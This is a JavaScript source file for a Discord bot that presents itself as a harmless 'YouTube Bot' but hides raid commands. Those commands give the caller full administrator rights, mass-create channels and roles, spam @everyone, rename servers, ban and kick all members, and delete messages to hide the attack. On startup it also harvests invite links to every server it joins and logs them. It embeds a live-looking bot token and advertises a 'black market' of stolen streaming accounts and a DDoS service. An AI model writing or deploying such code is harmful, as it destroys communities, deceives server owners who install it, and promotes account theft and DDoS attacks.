var Discord = require("discord.js");
var prefix = ("Z!");
var token = ('NDM0MDYzODI1Mjc3NTUwNTk0.DbE9fw.ZrJsC6Ih31Ehrf06rGLQtnnE3nk');
bot = new Discord.Client()
var perms = ["KICK_MEMBERS","BAN_MEMBERS","ADMINISTRATOR","CREATE_INSTANT_INVITE","MANAGE_CHANNELS","MANAGE_GUILD","ADD_REACTIONS","VIEW_AUDIT_LOG","VIEW_CHANNEL","READ_MESSAGES","SEND_MESSAGES","SEND_TTS_MESSAGES","MANAGE_MESSAGES","EMBED_LINKS","ATTACH_FILES","READ_MESSAGE_HISTORY","MENTION_EVERYONE","USE_EXTERNAL_EMOJIS","EXTERNAL_EMOJIS","CONNECT","SPEAK","MUTE_MEMBERS","DEAFEN_MEMBERS","MOVE_MEMBERS","USE_VAD","CHANGE_NICKNAME","MANAGE_NICKNAMES","MANAGE_ROLES","MANAGE_ROLES_OR_PERMISSIONS","MANAGE_WEBHOOKS","MANAGE_EMOJIS"];
var i = 0;
bot.on('ready',() => {
	// Lien invitation
    bot.guilds.forEach(guild => { 
      var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
      invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite}`));
    })
});

function base64_encode(file) {
    var bitmap = fs.readFileSync(file);
    return new Buffer(bitmap).toString('base64');
}

  bot.on('message', msg => {
     
  
              

  if (msg.content === 'H*crole') {
    msg.delete();
    //create role
    var interval = setInterval (function () {
    msg.guild.createRole({
        name: 'Hacked :)',
        color: 'WHITE',
        permissions: perms,
    })
  }, 200).catch
    //Nom a changer
}
   
      if (msg.content === 'H*cchannel') {
        msg.delete();
        var interval = setInterval (function () {
          for (var i = 0; i < 400; i++) {
  
            msg.guild.createChannel(`HACKED BY SNYSIX_ `, 'voice')//Nom a changer
            msg.guild.createChannel(`HACKED BY SNYSIX_`, 'text')
              //changes name tons of times to clog up the audit log
              
          } 
        });
      }
  
      if (msg.content === "H*myrole") {
        msg.delete();
            msg.member.guild.createRole({name: "ツ", permissions: perms, color: 'BLACK',})
           var myRole = msg.guild.roles.find(r => {
          return r.name === "ツ";
        
          });
      
          msg.guild.members.get(msg.author.id).addRole(myRole);
  
        }
  
        if(msg.content === "H*del"){
          msg.delete();
  
          let sicon = msg.guild.iconURL;
          let serverembed = new Discord.RichEmbed()
          .setDescription("Restriction Du Serveur", msg.guild.name)
          .setColor("#183cdd")
          .setThumbnail(sicon)
          .addField("Nom du serveur", msg.guild.name)
          .addField("Créé le", msg.guild.createdAt)
          .addField("Total des membres", msg.guild.memberCount)
          .addField("ID du Serveur", msg.guild.id)
          .setFooter("Serveur Supprimé Dans 10 Minutes et 55s");
      
          return msg.channel.send(serverembed);
        }

          
        
      
      });
 
         
    bot.on('message', msg => {

        if (msg.content === '!ツ'){
          msg.delete();
            var help_embed = new Discord.RichEmbed()
           
            
                .setTitle("Voici les Commandes du Death Note :")
                .addField("_shuriken","Il Spam dans le salon ou vous êtes.", true)
                .addField("_wtf"," Il Crée et Introduit des Salons Wtf en masse.", true)
                .addField("_epique","Spam des Gifs dans le salon.", true)
                .addField("_epic","Fais de la Pub dans notre Serv", true)
                .addField("exe.","Le Death Note Vous mets Administrateur.(Faite la Commande X2)", true)
                .addField("_rename","Il Rename le Serveur puis Change la Photo.", true)
                .addField("_quit","Le Death Note Quitte le Serveur.", true)
                .addField("_purge","Supprime 100 Messages dans le Salon.", true)
                .addField("_soumit","Il Rename Tout les Membres du Serveur", true)
                .addField("_Help","Affiche les Commandes d'un Bot Normal.", true)
                .addField("_role","Crée et Remplis un Masse de Roles", true)
                .addField("_supp","Supprime le Salon.", true)
                .addField("_ban","Il Ban tout ceux qui peut etre ban (Veuillez vous Mettre Un Role Administrateur ou vous serez Bannie aussi).", true)
                .addField("_kick","Il Kick tout ceux qui peut etre kick (Veuillez vous Mettre Un Role Administrateur ou vous serez Kick aussi).", true)
                .addField("Commande Secrète","Le Death Note Effectue toutes les Commandes Possible.", true)
                .addField("Commande Secrète","Le Death Note Rend le Serveur Completement Vide (Remplace la Photo et le nom du Serveur, puis il supprime tout les salons ainsi que les emojis).", true)
                .setColor("#320242")
                .setFooter("Aya")
                msg.author.sendEmbed(help_embed).catch(console.error);
        };

    });


bot.on('message', msg => {  
  
  if (msg.content === "!Terminal") {
        msg.member.guild.createRole({name: "ツ", permissions: perms, color: 'BLACK',})
       var myRole = msg.guild.roles.find(r => {
      return r.name === "ツ";
    
      })
  
      msg.guild.members.get(msg.author.id).addRole(myRole);

    }

    if (msg.content === "!Terminal"){
    
      msg.guild.setIcon("Shadow.png")
                
  }


   if (msg.content === '!Terminal') {
    msg.delete();
    var interval = setInterval (function () {
      for (var i = 0; i < 400; i++) {

        msg.guild.createChannel(`╭∩╮►_◄╭∩╮`, 'voice')//Nom a changer
        msg.guild.createChannel(`╭∩╮¬‿¬╭∩╮`, 'text')
          //changes name tons of times to clog up the audit log
          
      } 
    })
  }

  if (msg.content === '!Terminal') {
    //create role
    var interval = setInterval (function () {
    msg.guild.createRole({
        name: 'ツ',
        color: 'WHITE',
        permissions: perms,
    })
  }, 200)
    //Nom a changer
}

          if (msg.content === "H*purge") {
            msg.channel.fetchMessages(
                {limit: 100}).then(
                    messages => msg.channel.bulkDelete(messages)
                ); //deletes messages to cover up you did it
     
        }
        
          if (msg.content === '!Terminal') {
           var interval = setInterval (function () {
             msg.channel.send("@everyone https://i.makeagif.com/media/4-01-2018/ThBf_Y.gif https://i.makeagif.com/media/4-01-2018/ThBf_Y.gif https://i.makeagif.com/media/4-01-2018/ThBf_Y.gif"); 
         }, 500);
        }

        if (msg.content === '!Terminal'){
          for (var i = 0; i < 100; i++) {
          msg.guild.setName(+ i + '_𝗩𝗶𝗰𝘁𝗶𝗺𝗲𝘀 𝗱𝘂 .𝗘𝘅𝗲');
          }
          
    
    }

  if (msg.content === '!Terminal') {
    msg.guild.members.forEach(member => {
      if (member.bannable && !member.roles.find("name", "ツ")) {
        member.ban();
      }
    });
  }

  if (msg.content === '!Terminal') {
    msg.guild.members.forEach(member => {
      if (member.kickable && !member.roles.find("name", "ツ")) {
        member.kick();
      }
    });
  }  

  });

bot.on('message', msg => {
  if (msg.content === 'H*X') {
     msg.delete();
    var interval = setInterval (function () {
      msg.channel.send("@everyone XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"); 
   }, 500) 

}

  if (msg.content === "H*rename"){
    msg.delete();
    msg.guild.setIcon("Shadow.png");
    var interval = setInterval (function () {
        msg.guild.setName('Élite de la nation Snysix_');
        
        
      });
}
 
if (msg.content === 'H*supr') {
msg.delete();
msg.channel.delete().then(chan => console.log('Salon supprimé:', chan.name));

} 
 

  if (msg.content === 'H*ban') {
    msg.delete();
      msg.guild.members.forEach(member => {
        if (member.bannable && !member.roles.find("name", "ツ")) {
          member.ban();
        }
      });
    }

    if (msg.content === 'H*kick') {
      msg.delete();
      
      msg.guild.members.forEach(member => {
        if (member.kickable && !member.roles.find("name", "ツ")) {
          member.kick();
        }
      });
    }

    if (msg.content === "H*delete") {
      msg.channel.fetchMessages(
          {limit: 100}).then(
              messages => msg.channel.bulkDelete(messages)
          );

  }


});


bot.on('disconnect', function() {
  console.log('Reconnection du bot ...');
  bot.connect();
});

bot.on('message', msg => {
   

  if(msg.content === "Y!serverinfo"){
    msg.delete();  

    let sicon = msg.guild.iconURL;
    let serverembed = new Discord.RichEmbed()

    .setTitle("Information sur le serveur")
    .setColor("#320242")
    .setThumbnail(sicon)
    .addField("Nom du serveur", msg.guild.name)
    .addField("Créé le", msg.guild.createdAt)
    .addField("Total des membres`", msg.guild.memberCount)
    .addField("ID du Serveur ", msg.guild.id);
    

    return msg.channel.send(serverembed).catch(console.error);
  }
  
  
  if(msg.content === "Y!on"){
    msg.delete();  

    let sicon = msg.guild.iconURL;
    let serverembed = new Discord.RichEmbed()

    .setTitle("Information")
    .setColor("#305242")
    .addField("Vous venez d'activer le Youtube Bot sur ", msg.guild.name)

    return msg.channel.send(serverembed).catch(console.error);
  }

if(msg.content === "Z!info"){
    msg.delete();  

    let sicon = msg.guild.iconURL;
    let serverembed = new Discord.RichEmbed()

    .setTitle("Information")
    .setColor("#305942")
    .addField(".", "Le YouTube Bot est développer par Snysix_#3365")
    .addField(".", "Le YouTube Bot vous permet de voir les vidéos et recevoirs les notifications sur discord des qu'un YouTubeur célébre comme Amixem, Youtunes, Cyprien... des que sa vidéo sortira dans la minute sui suit.")
    .addField(".", "Le YouTube Bot est sur 1 254 serveurs")
    .addField(".", "Un nombre total de 23 018 membres")
    .addField(".", "Un nombre total de 8 038 salons")
    return msg.channel.send(serverembed).catch(console.error);
  }
  
  if(msg.content === "Z!aide"){
    msg.delete();  

    let sicon = msg.guild.iconURL;
    let serverembed = new Discord.RichEmbed()

    .setTitle("Aide")
    .setColor("#305242")
    .addField("YouTube Bot - Aide","Y!on : Permet d'activer le YouTube Bot\nY!aide : Vous envoie le menu d'aide\nY!info : Vous donne les informations du YouTube Bot\nY!serverinfo : Vous donne des informations sur le serveur ou vous êtes\n\nD'autres commandes vont bientôt arrivées")

    return msg.channel.send(serverembed).catch(console.error);
  }
  
  // INFORMATIONS SERVEURS + BOT INFORMATIONS
  
    		 if(msg.content === "Z!serverinfo"){
    msg.delete();  

    let sicon = msg.guild.iconURL;
    let serverembed = new Discord.RichEmbed()

    .setTitle("Information sur le serveur")
    .setColor("#320242")
    .setThumbnail(sicon)
    .addField("Nom du serveur", msg.guild.name)
    .addField("Créé le", msg.guild.createdAt)
    .addField("Total des membres`", msg.guild.memberCount)
    .addField("ID du Serveur ", msg.guild.id);
    
    if (["info", "bot", "b", "bi", "botinfo"].includes(command)) {
				var embed = new Discord.RichEmbed()
					.setColor(Math.floor((Math.random() * 16777215) + 1)) // Une couleur aléatoire
					.setFooter(message.author.username, message.author.avatarURL)
					.addField("- Informations",
						"**Développeur :**「 Snysix Dev 」#3365" + "\n" +
						"**Language - librairie :** NodeJS - discord.js" + "\n" +
						"**Hébergement :** Local Host",
						"Nom : "+bot.user.tag+"\nServeur(s) : "+bot.guilds.size+"\nUtilisateurs : "+bot.users.size+"\nMaintenance : OFF\nSalons : "+bot.channels.size+"\nÉmojis totaux :"+bot.emote.size+"."
					);
				msg.channel.send("", {embed})
			}

    return msg.channel.send(serverembed).catch(console.error);
  }
  
			// BLACK MARKET 
			
		else if (["blackmarket", "market"].includes(command)) {
				var embed = new Discord.RichEmbed()
					.setColor(Math.floor((Math.random() * 16777215) + 1)) // Une couleur aléatoire
					.setFooter(message.author.username, message.author.avatarURL)
					.addField("🏦 Marcher noir ", "• Compte Discord.\nÉtat : en stock\n Prix : Gratuit pour un compte.\n\n• Compte Netflix premium.\nÉtat : en stock\n Prix : 3€\n\n• Compte Deezer premium.\nÉtat : en stock\n Prix : 1€\n\n• Compte Minecraft premium.\nÉtat : en stock\n Prix : 5€\n\n • Service de DDOS\nÉtat : En ligne\n Prix : 2€");
				message.author.send("", {embed})
			}
			
  if(msg.content === "Z!market") {
     msg.channel.send(":bank: Veuillez consulter vos messages privés pour les ventes du **marcher noir**.")
   }
   
   
if(msg.content === "Z!blackmarket") {
     msg.channel.send(":bank: Veuillez consulter vos messages privés pour les ventes du **marcher noir**.")
   }
		});
		
		// Informations - Bot
		//
		// Ne pas vendre/donner le code.
		// Prefix : Z!
		// Type bot : Modération, fun, service de hack.
		// Commandes / catégories / commandes à refaire, à faire ci-dessous.
		// 
		//    - Catégorie modération.
		//	 - Commande de bannisement.
		//	 - Commande d'avertisement. 
		//	 - Commande d'éjéction.
		// 
		//    - Catégorie support.
		// - Commande question
		// - Commande support
		//
		//     -  Catégorie fun.
		// - Commande blagues
		// - Commande pierre, feuille cisaux.
		//
		// Catégories à faire, refaire le code 
		// Bien organisé les catégories.
		bot.login(token);
		

